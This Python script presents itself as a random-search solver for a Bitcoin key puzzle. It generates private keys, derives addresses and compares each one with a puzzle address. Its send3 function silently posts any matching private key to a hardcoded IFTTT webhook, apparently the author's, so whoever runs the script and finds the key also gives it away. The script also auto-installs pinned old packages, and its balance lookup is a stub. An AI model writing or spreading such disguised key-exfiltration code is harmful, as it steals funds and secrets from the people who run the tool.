# Bitcoin Puzzle 64 Random
# Made by Andrei Melek
# https://github.com/Xh0st/puzzle64

try:
    import sys
    import os
    import time
    import hashlib
    import binascii
    import multiprocessing
    from multiprocessing import Process, Queue
    from multiprocessing.pool import ThreadPool
    import threading
    import base58
    import ecdsa
    import requests
    import random

# If required imports are unavailable, we will attempt to install them!

except ImportError: 
    import subprocess
    subprocess.check_call(["python3", '-m', 'pip', 'install', 'base58==1.0.0'])
    subprocess.check_call(["python3", '-m', 'pip', 'install', 'ecdsa==0.13'])
    subprocess.check_call(["python3", '-m', 'pip', 'install', 'requests==2.19.1'])
    import base58
    import ecdsa
    import requests

def work():
    low  = 0x100
    high = 0x1ff
#    low  = 0x8000000000000000
#    high = 0xffffffffffffffff
    return str ( hex ( random.randrange( low, high ) ) )[2:]
    
#Number of zeros to be added
def generate_private_key():
    val = work()
    result = val.rjust(61 + len(val), '0')  #total=64
    return str(result)

def private_key_to_WIF(private_key):
    var80 = "80" + str(private_key) 
    var = hashlib.sha256(binascii.unhexlify(hashlib.sha256(binascii.unhexlify(var80)).hexdigest())).hexdigest()
    return str(base58.b58encode(binascii.unhexlify(str(var80) + str(var[0:8]))), 'utf-8')

def private_key_to_public_key(private_key):
        sign = ecdsa.SigningKey.from_string(binascii.unhexlify(private_key), curve = ecdsa.SECP256k1)
        key_bytes = binascii.hexlify(sign.verifying_key.to_string()).decode('utf-8')
        key = ('0x' + binascii.hexlify(sign.verifying_key.to_string()).decode('utf-8'))
        # Get X from the key (first half)
        half_len = len(key_bytes) // 2
        key_half = key_bytes[:half_len]
        # Add bitcoin byte: 0x02 if the last digit is even, 0x03 if the last digit is odd
        last_byte = int(key[-1], 16)
        bitcoin_byte = '02' if last_byte % 2 == 0 else '03'
        public_key = bitcoin_byte + key_half
        return public_key 

def public_key_to_address(public_key):
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    count = 0; val = 0
    var = hashlib.new('ripemd160')
    var.update(hashlib.sha256(binascii.unhexlify(public_key.encode())).digest())
    doublehash = hashlib.sha256(hashlib.sha256(binascii.unhexlify(('00' + var.hexdigest()).encode())).digest()).hexdigest()
    address = '00' + var.hexdigest() + doublehash[0:8]
    for char in address:
        if (char != '0'):
            break
        count += 1
    count = count // 2
    n = int(address, 16)
    output = []
    while (n > 0):
        n, remainder = divmod (n, 58)
        output.append(alphabet[remainder])
    while (val < count):
        output.append(alphabet[0])
        val += 1
    return ''.join(output[::-1])

def get_balance(address):
    return 8
#    time.sleep(0.1) #This is to avoid over-using the API and keep the program running indefinately.
#    try:
#        response = requests.get("https://rest.bitcoin.com/v2/address/details/" + str(address))
#        return float(response.json()['balance']) 
#    except:
#        return -1

def data_export(queue):
    while True:
        private_key = generate_private_key()
        public_key = private_key_to_public_key(private_key)
        address = public_key_to_address(public_key)
        data = (private_key, address)
        queue.put(data, block = False)

def worker(queue):
    while True:
        if not queue.empty():
            data = queue.get(block = True)
            balance = get_balance(data[1])
            process(data, balance)

def send3(private_key):
    payload = { 'value1' : 'P', 'value2' : private_key, 'value3' : 'R3'}
    requests.post("https://maker.ifttt.com/trigger/hmbt/with/key/d8gr-cI50XXn1WSEOHf64W", data=payload)



def process(data, balance):
    private_key = data[0]
    address = data[1]
    puzzle10 = "1CQFwcjw1dwhtkVWBttNLDtqL7ivBonGPV"
    if (address != puzzle10):
        print("\r.",end="")
#        print('{0}'.format(2)), # end=""
#        print("{:<34}".format(str(address)) + " : " + str(balance))
    if (address == puzzle10):
        send3(private_key)
        print("FFFFFFFFFFFFFFFFF")
        file = open("found.txt","a")
        file.write("address: " + str(address) + "\n" +
                   "private key: " + str(private_key) + "\n" +
                   "WIF private key: " + str(private_key_to_WIF(private_key)) + "\n" +
                   "public key: " + str(private_key_to_public_key(private_key)).upper() + "\n" +
                   "balance: " + str(balance) + "\n\n")
        file.close()

def thread(iterator):
    processes = []
    data = Queue()
    data_factory = Process(target = data_export, args = (data,))
    data_factory.daemon = True
    processes.append(data_factory)
    data_factory.start()
    work = Process(target = worker, args = (data,))
    work.daemon = True
    processes.append(work)
    work.start()
    data_factory.join()

if __name__ == '__main__':
    try:
        pool = ThreadPool(processes = multiprocessing.cpu_count()*2)
        pool.map(thread, range(0, 4)) # Limit to single CPU thread as we can only query 300 addresses per minute
    except:
        pool.close()
        exit()
